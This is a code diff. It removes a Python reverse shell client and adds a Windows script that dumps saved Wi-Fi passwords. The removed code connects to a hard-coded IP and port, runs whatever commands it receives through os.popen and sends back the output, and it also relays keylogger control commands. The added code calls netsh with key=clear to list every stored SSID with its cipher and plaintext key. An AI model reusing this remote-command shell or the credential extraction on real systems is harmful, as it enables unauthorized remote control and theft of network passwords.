@@ -1,26 +1,68 @@
-import socket
-import os
-import time
+import subprocess
+import re
+from collections import namedtuple
 
-def reverse_shell():
-    host = "10.0.1.12"  # Replace with the IP of the server
-    port = 9999  # The same port as in the server
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sock.connect((host, port))
+def get_windows_saved_ssids():
+    """Returns a list of saved SSIDs in a Windows machine using netsh command"""
+    # get all saved profiles in the PC
+    try:
+        output = subprocess.check_output("netsh wlan show profiles").decode()
+    except subprocess.CalledProcessError:
+        print("Error retrieving profiles.")
+        return []
     
-    while True:
-        # Receive commands from the server
-        command = sock.recv(1024).decode()
-        if command.lower() == "exit":
-            sock.close()
-            break
-        elif command.lower().startswith("key_"):
-            # Start, stop or dump keylogger from the server
-            sock.send(command.encode())
-        else:
-            # Execute system commands
-            result = os.popen(command).read()
-            sock.send(result.encode())
+    ssids = []
+    profiles = re.findall(r"All User Profile\s(.*)", output)
+    for profile in profiles:
+        # for each SSID, remove spaces and colon
+        ssid = profile.strip().strip(":").strip()
+        # add to the list
+        ssids.append(ssid)
+    return ssids
 
-if __name__ == "__main__":
-    reverse_shell()
+def get_windows_saved_wifi_passwords(verbose=1):
+    """Extracts saved Wi-Fi passwords saved in a Windows machine, this function extracts data using netsh
+    command in Windows
+    Args:
+        verbose (int, optional): whether to print saved profiles real-time. Defaults to 1.
+    Returns:
+        [list]: list of extracted profiles, a profile has the fields ["ssid", "ciphers", "key"]
+    """
+    ssids = get_windows_saved_ssids()
+    Profile = namedtuple("Profile", ["ssid", "ciphers", "key"])
+    profiles = []
+    for ssid in ssids:
+        try:
+            ssid_details = subprocess.check_output(f'netsh wlan show profile "{ssid}" key=clear').decode()
+        except subprocess.CalledProcessError:
+            print(f"Error retrieving details for SSID: {ssid}")
+            continue
+
+        # get the ciphers
+        ciphers = re.findall(r"Cipher\s(.*)", ssid_details)
+        # clear spaces and colon
+        ciphers = "/".join([c.strip().strip(":").strip() for c in ciphers])
+        
+        # get the Wi-Fi password
+        key = re.findall(r"Key Content\s(.*)", ssid_details)
+        # clear spaces and colon
+        key = key[0].strip().strip(":").strip() if key else "None"
+        
+        profile = Profile(ssid=ssid, ciphers=ciphers, key=key)
+        
+        if verbose >= 1:
+            print_windows_profile(profile)
+        
+        profiles.append(profile)
+    
+    return profiles
+
+def print_windows_profile(profile):
+    """Prints a single profile on Windows"""
+    print(f"{profile.ssid:25}{profile.ciphers:15}{profile.key:50}")
+
+def print_windows_profiles(verbose=1):
+    """Prints all extracted SSIDs along with Key on Windows"""
+    print("SSID                     CIPHER(S)      KEY")
+    print("-" * 50)
+    get_windows_saved_wifi_passwords(verbose)
